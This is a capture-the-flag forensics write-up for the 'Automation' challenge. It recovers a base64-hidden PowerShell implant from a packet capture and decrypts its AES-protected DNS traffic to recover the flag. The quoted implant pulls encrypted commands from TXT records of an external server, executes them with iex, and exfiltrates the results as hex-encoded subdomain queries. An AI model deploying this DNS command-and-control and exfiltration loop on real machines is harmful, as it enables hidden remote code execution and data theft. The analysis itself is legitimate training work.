---
layout: load_md
title: The White Circle | Cyber Apocalypse 2022 | Automation Writeup
desc: Check out our writeup for Automation for Cyber Apocalypse 2022 capture the flag competition.
image: images/twc_og_banner.jpg
ctf: Cyber Apocalypse 2022
parent: cyber_apocalypse_2022
category: forensics
challenge: Automation
tags: "forensics, legend, starry, twh, pcap, powershell, aes"
date: 2022-05-21T00:00:00+00:00
last_modified_at: 2022-05-21T00:00:00+00:00
---


> Solved By : Legend, Starrylord, thewhiteh4t

In this challenge we got a PCAP file to work with. First I tried to export HTTP objects and got an image file

![](https://i.imgur.com/rbB8UjN.png)

the PNG turns out to be base64 encoded string…

![](https://i.imgur.com/bWfhsBf.png)

After decoding we get a powershell script…

```powershell
> base64 -d desktop.png
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)

        }
        else {
            $aesManaged.IV = $IV


        }
    }
    if ($key) {

        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Create-AesKey() {

    $aesManaged = Create-AesManagedObject $key $IV
    [System.Convert]::ToBase64String($aesManaged.Key)
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()
    [System.BitConverter]::ToString($fullData).replace("-","")
}

function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

filter parts($query) { $t = $_; 0..[math]::floor($t.length / $query) | % { $t.substring($query * $_, [math]::min($query, $t.length - $query * $_)) }}
$key = "a1E4MUtycWswTmtrMHdqdg=="
$out = Resolve-DnsName -type TXT -DnsOnly windowsliveupdater.com -Server 147.182.172.189|Select-Object -Property Strings;
for ($num = 0 ; $num -le $out.Length-2; $num++){
$encryptedString = $out[$num].Strings[0]
$backToPlainText = Decrypt-String $key $encryptedString
$output = iex $backToPlainText;$pr = Encrypt-String $key $output|parts 32
Resolve-DnsName -type A -DnsOnly start.windowsliveupdater.com -Server 147.182.172.189
for ($ans = 0; $ans -lt $pr.length-1; $ans++){
$domain = -join($pr[$ans],".windowsliveupdater.com")
Resolve-DnsName -type A -DnsOnly $domain -Server 147.182.172.189
    }
Resolve-DnsName -type A -DnsOnly end.windowsliveupdater.com -Server 147.182.172.189
}%
```

Lot of stuff but its really just an AES encryption and decryption code, but we have an IP address and a domain name in the last section :

```
147.182.172.189
windowsliveupdater.com
```

going back to wireshark we can filter packets using the IP :

![](https://i.imgur.com/4ULDbxt.png)

lot of weird subdomains but most interesting is the second packet i.e. the one with multiple TXT response, expanding the answers section shows multiple responses and each of them are base64 encoded…

![](https://i.imgur.com/xKm74Z6.png)

```
"Ifu1yiK5RMABD4wno66axIGZuj1HXezG5gxzpdLO6ws="

"hhpgWsOli4AnW9g/7TM4rcYyvDNky4yZvLVJ0olX5oA="

"58v04KhrSziOyRaMLvKM+JrCHpM4WmvBT/wYTRKDw2s="

"eTtfUgcchm/R27YJDP0iWnXHy02ijScdI4tUqAVPKGf3nsBE28fDUbq0C8CnUnJC57lxUMYFSqHpB5bhoVTYafNZ8+ijnMwAMy4hp0O4FeH0Xo69ahI8ndUfIsiD/Bru"

"BbvWcWhRToPqTupwX6Kf7A0jrOdYWumqaMRz6uPcnvaDvRKY2+eAl0qT3Iy1kUGWGSEoRu7MjqxYmek78uvzMTaH88cWwlgUJqr1vsr1CsxCwS/KBYJXhulyBcMMYOtcqImMiU3x0RzlsFXTUf1giNF2qZUDthUN7Z8AIwvmz0a+5aUTegq/pPFsK0i7YNZsK7JEmz+wQ7Ds/UU5+SsubWYdtxn+lxw58XqHxyAYAo0="

"vJxlcLDI/0sPurvacG0iFbstwyxtk/el9czGxTAjYBmUZEcD63bco9uzSHDoTvP1ZU9ae5VW7Jnv9jsZHLsOs8dvxsIMVMzj1ItGo3dT+QrpsB4M9wW5clUuDeF/C3lwCRmYYFSLN/cUNOH5++YnX66b1iHUJTBCqLxiEfThk5A="

"M3/+2RJ/qY4O+nclGPEvJMIJI4U6SF6VL8ANpz9Y6mSHwuUyg4iBrMrtSsfpA2bh"
```

Now I went back to the script and the following section is related with the above base64 stuff…

```powershell
$out = Resolve-DnsName -type TXT -DnsOnly windowsliveupdater.com -Server 147.182.172.189|Select-Object -Property Strings;
for ($num = 0 ; $num -le $out.Length-2; $num++){
$encryptedString = $out[$num].Strings[0]
$backToPlainText = Decrypt-String $key $encryptedString
$output = iex $backToPlainText;
```

- It’s fetching TXT records from the domain with a specific server for resolving it
- in a for loop each base64 response is decrypted
- then its executed in the last line

So I modified the script to output the decrypted part…

```powershell
$out = "Ifu1yiK5RMABD4wno66axIGZuj1HXezG5gxzpdLO6ws=", "hhpgWsOli4AnW9g/7TM4rcYyvDNky4yZvLVJ0olX5oA=", "58v04KhrSziOyRaMLvKM+JrCHpM4WmvBT/wYTRKDw2s=", "eTtfUgcchm/R27YJDP0iWnXHy02ijScdI4tUqAVPKGf3nsBE28fDUbq0C8CnUnJC57lxUMYFSqHpB5bhoVTYafNZ8+ijnMwAMy4hp0O4FeH0Xo69ahI8ndUfIsiD/Bru", "BbvWcWhRToPqTupwX6Kf7A0jrOdYWumqaMRz6uPcnvaDvRKY2+eAl0qT3Iy1kUGWGSEoRu7MjqxYmek78uvzMTaH88cWwlgUJqr1vsr1CsxCwS/KBYJXhulyBcMMYOtcqImMiU3x0RzlsFXTUf1giNF2qZUDthUN7Z8AIwvmz0a+5aUTegq/pPFsK0i7YNZsK7JEmz+wQ7Ds/UU5+SsubWYdtxn+lxw58XqHxyAYAo0=", "vJxlcLDI/0sPurvacG0iFbstwyxtk/el9czGxTAjYBmUZEcD63bco9uzSHDoTvP1ZU9ae5VW7Jnv9jsZHLsOs8dvxsIMVMzj1ItGo3dT+QrpsB4M9wW5clUuDeF/C3lwCRmYYFSLN/cUNOH5++YnX66b1iHUJTBCqLxiEfThk5A=", "M3/+2RJ/qY4O+nclGPEvJMIJI4U6SF6VL8ANpz9Y6mSHwuUyg4iBrMrtSsfpA2bh"
for ($num = 0 ; $num -le $out.Length-1; $num++){
    $encryptedString = $out[$num]
    $backToPlainText = Decrypt-String $key $encryptedString
    echo "$backToPlainText"
}
```

here `out` is an array of base64 strings and then the same for loop…

![](https://i.imgur.com/CmAj7fo.png)

so these are set of commands which are decrypted and executed. In the 5th command we have some more base64 stuff and on decoding it we get part one of flag…

![](https://i.imgur.com/COJT0Bq.png)

Now lets proceed to next section of the code…

```powershell
$output = iex $backToPlainText;
$pr = Encrypt-String $key $output|parts 32
Resolve-DnsName -type A -DnsOnly start.windowsliveupdater.com -Server 147.182.172.189
for ($ans = 0; $ans -lt $pr.length-1; $ans++){
$domain = -join($pr[$ans],".windowsliveupdater.com")
Resolve-DnsName -type A -DnsOnly $domain -Server 147.182.172.189
    }
Resolve-DnsName -type A -DnsOnly end.windowsliveupdater.com -Server 147.182.172.189
}%
```

- the output of those command is encrypted and split to 32 chars, if the output is longer it goes to next line and so on
- then it iterates over the encrypted strings and makes more DNS queries
- before start of loop it makes a query to `start.windowsliveupdater.com` and at the end of loop it queries `end.windowsliveupdater.com` so this makes it easy to get the order in wireshark

so first i extracted list of these subdomains using `tshark` :

```bash
tshark -nr capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name
```

![](https://i.imgur.com/AIEeHH7.png)

here is the result and for ease of reading I have separated the sections and removed other extra queries :

```
start.windowsliveupdater.com
CC1C9AC2958A2E63609272E2B4F8F436.windowsliveupdater.com
32A806549B03AB7E4EB39771AEDA4A1B.windowsliveupdater.com
C1006AC8A03F9776B08321BD6D5247BB.windowsliveupdater.com
end.windowsliveupdater.com

start.windowsliveupdater.com
7679895D1CF7C07BB6A348E1AA4AFC65.windowsliveupdater.com
5958A6856F1A34AAD5E97EA55B087670.windowsliveupdater.com
35F2497E5836EA0ECA1F1280F59742A3.windowsliveupdater.com
end.windowsliveupdater.com

start.windowsliveupdater.com
09E28DD82C14BC32513652DAC2F2C27B.windowsliveupdater.com
0D73A3288A980D8FCEF94BDDCF9E2822.windowsliveupdater.com
2A1CA17BB2D90FCD6158856348790414.windowsliveupdater.com
20FC39C684A9E371CC3A06542B666005.windowsliveupdater.com
5840BD94CCE65E23613925B4D9D2BA53.windowsliveupdater.com
18EA75BC653004D45D505ED62567017A.windowsliveupdater.com
6FA4E7593D83092F67A81082D9930E99.windowsliveupdater.com
BA20E34AACC4774F067442C6622F5DA2.windowsliveupdater.com
A9B09FF558A8DF000ECBD37804CE663E.windowsliveupdater.com
3521599BC7591005AB6799C57068CF0D.windowsliveupdater.com
C6884CECF01C0CD44FD6B82DB788B35D.windowsliveupdater.com
62F02E4CAA1D973FBECC235AE9F40254.windowsliveupdater.com
C63D3C93C89930DA2C4F42D9FC123D8B.windowsliveupdater.com
AB00ACAB5198AFCC8C6ACD81B19CD264.windowsliveupdater.com
CC6353668CEA4C88C8AEEA1D58980022.windowsliveupdater.com
DA8FA2E917F17C28608818BF550FEA66.windowsliveupdater.com
973B5A8355258AB0AA281AD88F5B9EB1.windowsliveupdater.com
03AC666FE09A1D449736335C09484D27.windowsliveupdater.com
1C301C6D5780AB2C9FA333BE3B0185BF.windowsliveupdater.com
071FB1205C4DBEAA2241168B0748902A.windowsliveupdater.com
6CE14903C7C47E7C87311044CB9873A4.windowsliveupdater.com
end.windowsliveupdater.com

start.windowsliveupdater.com
ECABC349D27C0B0FFFD1ACEEDBE06BB6.windowsliveupdater.com
C2EB000EE4F9B35D6F001500E85642A2.windowsliveupdater.com
DCC8F1BE2CF4D667F458C1DE46D24B1C.windowsliveupdater.com
2E0F5D94E52649C70402C1B0A2FF7B49.windowsliveupdater.com
FC32DDD67F275307A74B2C4D0864B3F0.windowsliveupdater.com
486186DA9443EB747F717B3911C959DC.windowsliveupdater.com
7E300844D60655410C3988238E615D61.windowsliveupdater.com
6F33D27F63CE4D1E065A416911BC50D4.windowsliveupdater.com
58749599D2CB08DB561988EB2902E05D.windowsliveupdater.com
9886FDDAC2BED6F6DA73637AD2F20CF1.windowsliveupdater.com
99B8CE3D9DEE03C0180C7D1198B49C02.windowsliveupdater.com
99B8CE3D9DEE03C0180C7D1198B49C02.windowsliveupdater.com
769E5EE4EAB896D7D3BB478EA1408167.windowsliveupdater.com
769E5EE4EAB896D7D3BB478EA1408167.windowsliveupdater.com
79472A243BFB0852AF372323EC132988.windowsliveupdater.com
3C81A3F2AEB1D3DAAE8496E1DBF97F43.windowsliveupdater.com
5AE40A09203B890C4A174D77CB7026C4.windowsliveupdater.com
E990A6FB6424A7501823AD31D3D6B634.windowsliveupdater.com
4C7971C8D447C078C4471732AD881C39.windowsliveupdater.com
4BC8B1A66E0BED43DDC359269B57D1D5.windowsliveupdater.com
D68DCD2A608BF61716BB47D6FE4D5C9D.windowsliveupdater.com
6E8BB2981F214A8234B0DD0210CA96EB.windowsliveupdater.com
2D6322B0F7F3D748C4C9F8B80EFF5A69.windowsliveupdater.com
21A3D1A8621A49F4D29BC9851D25230B.windowsliveupdater.com
end.windowsliveupdater.com

start.windowsliveupdater.com
841BDB4E9E5F8BF721B58E8308177B57.windowsliveupdater.com
2E9A015967DA5BF11AC9155FC2159C8F.windowsliveupdater.com
610CD82F818B4BDF5E48722DAF4BEEEB.windowsliveupdater.com
ABCE30583F503B484BF99020E28A1B8F.windowsliveupdater.com
282A23FEB3A21C3AD89882F5AC0DD3D5.windowsliveupdater.com
7D87875231652D0F4431EC37E51A09D5.windowsliveupdater.com
7E2854D11003AB6E2F4BFB4F7E2477DA.windowsliveupdater.com
A44FCA3BC6021777F03F139D458C0524.windowsliveupdater.com
end.windowsliveupdater.com

start.windowsliveupdater.com
AE4ABE8A3A88D21DEEA071A72D65A35E.windowsliveupdater.com
F158D9F025897D1843E37B7463EC7833.windowsliveupdater.com
end.windowsliveupdater.com
```

I modified the decrypt function to decrypt these because the original one expects base64 input but these are hex :

```powershell
function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

function Decrypt-Part-2($key, $encryptedStringWithIV) {
    $bytes = [byte[]]::new($encryptedStringWithIV.Length / 2)
    For($i=0; $i -lt $encryptedStringWithIV.Length; $i+=2){
        $bytes[$i/2] = [convert]::ToByte($encryptedStringWithIV.Substring($i, 2), 16)
    }
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}
```

first one is the original and then you can see the modified one, first it converts hex to bytes and then the steps are same.

I also added some more code to decrypt the subdomains, now since the original code splits the hex strings and makes multiple queries I concatenated the strings and made an array like in the first part and decrypted all of them in a loop :

```powershell
$cipher_arr = "CC1C9AC2958A2E63609272E2B4F8F43632A806549B03AB7E4EB39771AEDA4A1BC1006AC8A03F9776B08321BD6D5247BB", "09E28DD82C14BC32513652DAC2F2C27B0D73A3288A980D8FCEF94BDDCF9E28222A1CA17BB2D90FCD615885634879041420FC39C684A9E371CC3A06542B6660055840BD94CCE65E23613925B4D9D2BA5318EA75BC653004D45D505ED62567017A6FA4E7593D83092F67A81082D9930E99BA20E34AACC4774F067442C6622F5DA2A9B09FF558A8DF000ECBD37804CE663E3521599BC7591005AB6799C57068CF0DC6884CECF01C0CD44FD6B82DB788B35D62F02E4CAA1D973FBECC235AE9F40254C63D3C93C89930DA2C4F42D9FC123D8BAB00ACAB5198AFCC8C6ACD81B19CD264CC6353668CEA4C88C8AEEA1D58980022DA8FA2E917F17C28608818BF550FEA66973B5A8355258AB0AA281AD88F5B9EB103AC666FE09A1D449736335C09484D271C301C6D5780AB2C9FA333BE3B0185BF071FB1205C4DBEAA2241168B0748902A6CE14903C7C47E7C87311044CB9873A4", "7679895D1CF7C07BB6A348E1AA4AFC655958A6856F1A34AAD5E97EA55B08767035F2497E5836EA0ECA1F1280F59742A3", "ECABC349D27C0B0FFFD1ACEEDBE06BB6C2EB000EE4F9B35D6F001500E85642A2DCC8F1BE2CF4D667F458C1DE46D24B1C2E0F5D94E52649C70402C1B0A2FF7B49FC32DDD67F275307A74B2C4D0864B3F0486186DA9443EB747F717B3911C959DC7E300844D60655410C3988238E615D616F33D27F63CE4D1E065A416911BC50D458749599D2CB08DB561988EB2902E05D9886FDDAC2BED6F6DA73637AD2F20CF199B8CE3D9DEE03C0180C7D1198B49C0299B8CE3D9DEE03C0180C7D1198B49C02769E5EE4EAB896D7D3BB478EA1408167769E5EE4EAB896D7D3BB478EA140816779472A243BFB0852AF372323EC1329883C81A3F2AEB1D3DAAE8496E1DBF97F435AE40A09203B890C4A174D77CB7026C4E990A6FB6424A7501823AD31D3D6B6344C7971C8D447C078C4471732AD881C394BC8B1A66E0BED43DDC359269B57D1D5D68DCD2A608BF61716BB47D6FE4D5C9D6E8BB2981F214A8234B0DD0210CA96EB2D6322B0F7F3D748C4C9F8B80EFF5A6921A3D1A8621A49F4D29BC9851D25230B", "841BDB4E9E5F8BF721B58E8308177B572E9A015967DA5BF11AC9155FC2159C8F610CD82F818B4BDF5E48722DAF4BEEEBABCE30583F503B484BF99020E28A1B8F282A23FEB3A21C3AD89882F5AC0DD3D57D87875231652D0F4431EC37E51A09D57E2854D11003AB6E2F4BFB4F7E2477DAA44FCA3BC6021777F03F139D458C0524", "AE4ABE8A3A88D21DEEA071A72D65A35EF158D9F025897D1843E37B7463EC7833"
for ($num = 0 ; $num -le $cipher_arr.Length-1; $num++){
    $encryptedString = $cipher_arr[$num]
    $backToPlainText = Decrypt-Part-2 $key $encryptedString
    echo "$backToPlainText"
} 
```

here is the final script :

```powershell
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
     
        }
        else {
            $aesManaged.IV = $IV
     
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}
function Create-AesKey() {
  
    $aesManaged = Create-AesManagedObject $key $IV
    [System.Convert]::ToBase64String($aesManaged.Key)
}
function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()
    [System.BitConverter]::ToString($fullData).replace("-","")
}
function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}
function Decrypt-Part-2($key, $encryptedStringWithIV) {
    $bytes = [byte[]]::new($encryptedStringWithIV.Length / 2)
    For($i=0; $i -lt $encryptedStringWithIV.Length; $i+=2){
        $bytes[$i/2] = [convert]::ToByte($encryptedStringWithIV.Substring($i, 2), 16)
    }
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}
filter parts($query) { $t = $_; 0..[math]::floor($t.length / $query) | % { $t.substring($query * $_, [math]::min($query, $t.length - $query * $_)) }} 
$key = "a1E4MUtycWswTmtrMHdqdg=="
$out = "Ifu1yiK5RMABD4wno66axIGZuj1HXezG5gxzpdLO6ws=", "hhpgWsOli4AnW9g/7TM4rcYyvDNky4yZvLVJ0olX5oA=", "58v04KhrSziOyRaMLvKM+JrCHpM4WmvBT/wYTRKDw2s=", "eTtfUgcchm/R27YJDP0iWnXHy02ijScdI4tUqAVPKGf3nsBE28fDUbq0C8CnUnJC57lxUMYFSqHpB5bhoVTYafNZ8+ijnMwAMy4hp0O4FeH0Xo69ahI8ndUfIsiD/Bru", "BbvWcWhRToPqTupwX6Kf7A0jrOdYWumqaMRz6uPcnvaDvRKY2+eAl0qT3Iy1kUGWGSEoRu7MjqxYmek78uvzMTaH88cWwlgUJqr1vsr1CsxCwS/KBYJXhulyBcMMYOtcqImMiU3x0RzlsFXTUf1giNF2qZUDthUN7Z8AIwvmz0a+5aUTegq/pPFsK0i7YNZsK7JEmz+wQ7Ds/UU5+SsubWYdtxn+lxw58XqHxyAYAo0=", "vJxlcLDI/0sPurvacG0iFbstwyxtk/el9czGxTAjYBmUZEcD63bco9uzSHDoTvP1ZU9ae5VW7Jnv9jsZHLsOs8dvxsIMVMzj1ItGo3dT+QrpsB4M9wW5clUuDeF/C3lwCRmYYFSLN/cUNOH5++YnX66b1iHUJTBCqLxiEfThk5A=", "M3/+2RJ/qY4O+nclGPEvJMIJI4U6SF6VL8ANpz9Y6mSHwuUyg4iBrMrtSsfpA2bh"
for ($num = 0 ; $num -le $out.Length-1; $num++){
    $encryptedString = $out[$num]
    $backToPlainText = Decrypt-String $key $encryptedString
    echo "$backToPlainText"
}
$cipher_arr = "CC1C9AC2958A2E63609272E2B4F8F43632A806549B03AB7E4EB39771AEDA4A1BC1006AC8A03F9776B08321BD6D5247BB", "09E28DD82C14BC32513652DAC2F2C27B0D73A3288A980D8FCEF94BDDCF9E28222A1CA17BB2D90FCD615885634879041420FC39C684A9E371CC3A06542B6660055840BD94CCE65E23613925B4D9D2BA5318EA75BC653004D45D505ED62567017A6FA4E7593D83092F67A81082D9930E99BA20E34AACC4774F067442C6622F5DA2A9B09FF558A8DF000ECBD37804CE663E3521599BC7591005AB6799C57068CF0DC6884CECF01C0CD44FD6B82DB788B35D62F02E4CAA1D973FBECC235AE9F40254C63D3C93C89930DA2C4F42D9FC123D8BAB00ACAB5198AFCC8C6ACD81B19CD264CC6353668CEA4C88C8AEEA1D58980022DA8FA2E917F17C28608818BF550FEA66973B5A8355258AB0AA281AD88F5B9EB103AC666FE09A1D449736335C09484D271C301C6D5780AB2C9FA333BE3B0185BF071FB1205C4DBEAA2241168B0748902A6CE14903C7C47E7C87311044CB9873A4", "7679895D1CF7C07BB6A348E1AA4AFC655958A6856F1A34AAD5E97EA55B08767035F2497E5836EA0ECA1F1280F59742A3", "ECABC349D27C0B0FFFD1ACEEDBE06BB6C2EB000EE4F9B35D6F001500E85642A2DCC8F1BE2CF4D667F458C1DE46D24B1C2E0F5D94E52649C70402C1B0A2FF7B49FC32DDD67F275307A74B2C4D0864B3F0486186DA9443EB747F717B3911C959DC7E300844D60655410C3988238E615D616F33D27F63CE4D1E065A416911BC50D458749599D2CB08DB561988EB2902E05D9886FDDAC2BED6F6DA73637AD2F20CF199B8CE3D9DEE03C0180C7D1198B49C0299B8CE3D9DEE03C0180C7D1198B49C02769E5EE4EAB896D7D3BB478EA1408167769E5EE4EAB896D7D3BB478EA140816779472A243BFB0852AF372323EC1329883C81A3F2AEB1D3DAAE8496E1DBF97F435AE40A09203B890C4A174D77CB7026C4E990A6FB6424A7501823AD31D3D6B6344C7971C8D447C078C4471732AD881C394BC8B1A66E0BED43DDC359269B57D1D5D68DCD2A608BF61716BB47D6FE4D5C9D6E8BB2981F214A8234B0DD0210CA96EB2D6322B0F7F3D748C4C9F8B80EFF5A6921A3D1A8621A49F4D29BC9851D25230B", "841BDB4E9E5F8BF721B58E8308177B572E9A015967DA5BF11AC9155FC2159C8F610CD82F818B4BDF5E48722DAF4BEEEBABCE30583F503B484BF99020E28A1B8F282A23FEB3A21C3AD89882F5AC0DD3D57D87875231652D0F4431EC37E51A09D57E2854D11003AB6E2F4BFB4F7E2477DAA44FCA3BC6021777F03F139D458C0524", "AE4ABE8A3A88D21DEEA071A72D65A35EF158D9F025897D1843E37B7463EC7833"
for ($num = 0 ; $num -le $cipher_arr.Length-1; $num++){
    $encryptedString = $cipher_arr[$num]
    $backToPlainText = Decrypt-Part-2 $key $encryptedString
    echo "$backToPlainText"
}
```

final result :

![](https://i.imgur.com/ZT39bCs.png)

and we can see 2nd part of flag.

